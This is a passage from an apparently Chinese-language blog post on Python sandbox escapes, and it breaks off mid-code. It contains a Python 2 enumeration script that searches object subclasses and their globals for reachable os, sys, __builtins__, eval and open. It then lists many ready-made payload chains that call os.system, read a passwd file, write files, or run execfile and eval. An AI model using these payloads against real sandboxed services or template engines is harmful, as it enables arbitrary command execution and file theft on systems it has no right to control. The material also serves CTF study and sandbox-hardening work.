<span class="string">'fnmatch'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'md5'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'commands'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-irix5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'DocXMLRPCServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-generic'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'weakref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ihooks'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'os2emxpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dummy_thread'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'robotparser'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-mac'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_LWPCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'wsgiref.egg-info'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sha'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'json'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Cookie'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tokenize'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-beos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'rexec'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib-tk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fractions'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'posixfile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'plat-netbsd1'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tkinter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'pickletools'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'anydbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'StringIO'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'markupbase'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'multifile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pickle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-os2emx'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetools'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'audiodev'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy_reg'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sre_compile'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'CGIHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imputil'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bsddb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'plat-sunos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dbhash'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dumbdbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_abcoll'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'MimeWriter'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statvfs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sets'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'htmlentitydefs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'SimpleXMLRPCServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunaudio'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pdb.doc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'user'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'xmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-next3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-aix4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-aix3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpclib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urlparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'htmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site-packages'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stringold'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'mhlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">all_targets = list(set(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">all_modules = list(set(find_modules.keys() + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">print(<span class="string">'----------1-----------'</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                print(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        print(i, f, target)</span><br><span class="line">print(<span class="string">'----------2-----------'</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.func_globals</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                print(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------3-----------'</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.func_globals.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                            print(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    print(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------4-----------'</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                print(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2019/05/31/Python沙箱逃逸小结/6.png" alt=""></p><p>下面简单归纳下遍历的4种方式：</p><p><strong>第一种方式</strong></p><p>序号为40，即file()函数，进行文件读取和写入，payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'E:/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'E:/test.txt'</span>, <span class="string">'w'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure><p>这和前面元素链构造时给出的Demo有点区别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'E:/passwd'</span>).read()</span><br></pre></td></tr></table></figure><p>序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。</p><p>当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少：</p><p><img src="/2019/05/31/Python沙箱逃逸小结/7.png" alt=""></p><p><strong>第二种方式</strong></p><p>先看序号为59的WarningMessage类有哪些而利用的模块或方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;linecache&apos;, [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;])</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;types&apos;, [&apos;__builtins__&apos;])</span><br></pre></td></tr></table></figure><p>以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确认linecache</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>]</span><br><span class="line"><span class="comment"># 返回linecache字典中的所有键</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__</span><br><span class="line">.keys()</span><br><span class="line"><span class="comment"># 在linecache字典的所有键中寻找os的序号，找到为12</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__</span><br><span class="line">.keys().index(<span class="string">'os'</span>)</span><br><span class="line"><span class="comment"># 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.keys()</span><br><span class="line"><span class="comment"># 在os字典的所有键中寻找system的序号，找到为79</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.keys().index(<span class="string">'system'</span>)</span><br><span class="line"><span class="comment"># 执行os.system()</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.values()[<span class="number">79</span>](<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linecache利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'sys'</span>].modules[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'E:/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'E:/test.txt'</span>, <span class="string">'w'</span>).write(<span class="string">'hello'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'execfile'</span>](<span class="string">'E:/exp.py'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("calc")'</span>)</span><br><span class="line">exec(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'compile'</span>](<span class="string">'__import__("os").system("calc")'</span>, <span class="string">'&lt;string&gt;'</span>, <span class="string">'exec'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'sys'</span>].modules[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># types利用，后面还是通过__builtins__实现利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'types'</span>].__dict__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>序号为60的catch_warnings类利用payload同上。</p><p>序号为61、62的两个类均只有__builtins__可利用，利用payload同上。</p><p>序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">78</span>].__init__.__globals__[<span class="string">'open'</span>](<span class="string">'E:/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">78</span>].__init__.__globals__[<span class="string">'open'</span>](<span class="string">'E:/test.txt'</span>, <span class="string">'w'</span>).write()</span><br></pre></td></tr></table></figure><p><strong>第三种方式</strong></p><p>先看下序号为59的WarningMessage类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 